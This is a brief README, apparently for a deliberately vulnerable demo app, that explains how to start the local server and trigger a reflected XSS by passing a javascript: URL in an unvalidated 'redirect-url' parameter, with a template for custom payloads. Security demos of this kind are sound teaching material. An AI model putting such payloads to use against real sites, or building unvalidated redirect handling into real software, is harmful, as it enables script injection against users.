## Getting Started

First, run the development server:

```bash
npm run dev
```

Next, open this URL in your browser to simulate an XSS attack on the website:

```
localhost:3000/auth?redirect-url=javascript:alert('xss')
```

For a custom payload, use the following format:

```
localhost:3000/auth?redirect-url=${your_js_code_here}
```